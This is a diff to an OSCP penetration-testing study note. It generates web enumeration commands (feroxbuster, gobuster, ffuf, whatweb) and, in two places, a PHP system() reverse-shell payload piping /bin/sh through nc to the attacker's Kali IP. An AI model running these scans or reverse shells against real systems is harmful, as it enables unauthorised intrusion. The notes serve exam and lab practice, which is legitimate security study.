@@ -2,7 +2,7 @@
 ---
 Visit the web Address
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `http://${ip}/`;
 
@@ -12,7 +12,7 @@ If find any domain names,
 
 Add hosts to /etc/hosts 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `echo "${ip} ${discoveredDomain}" | sudo tee -a /etc/hosts`;
@@ -23,7 +23,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 Identify CMS
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `whatweb http://${discoveredDomain}/`;
@@ -36,7 +36,7 @@ Use GoBuster to enumerate vhosts and directories
 
 Directories
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `feroxbuster -u http://${discoveredDomain}/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 --filter-status 404`;
@@ -44,7 +44,7 @@ const command = `feroxbuster -u http://${discoveredDomain}/ -w /usr/share/wordli
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `curl -i ${discoveredDomain}/[newfounddirectory]`;
@@ -59,7 +59,7 @@ Might find application powering the webserver
 
 FEROXBUSTER Sweep through file directories
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `feroxbuster -u http://${discoveredDomain}/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -t 80 -d 2`;
@@ -70,7 +70,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 VHosts
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `gobuster vhost -u http://${discoveredDomain}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`
@@ -80,7 +80,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 Add newfound vhost to /etc/hosts
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
 
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
@@ -92,7 +92,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 if API endpoint found, FUZZ with FFUF
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
 
 const command = `ffuf -w /usr/share/SecLists/Discovery/Web-Content/api/api-endpoints.txt -u http://${discoveredDomain}/FUZZ -ac`;
@@ -136,7 +136,7 @@ nc -lvnp 5553
 Send a request back to attacker Kali machine and see if capture anything
 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `http://${KaliIP}:5553`;
 
@@ -205,7 +205,7 @@ nc -lvnp 4444
 ```
 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;
 
@@ -234,7 +234,7 @@ nc -lvnp 4444
 ```
 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${KaliIP} 4444 >/tmp/f");?>`;
 
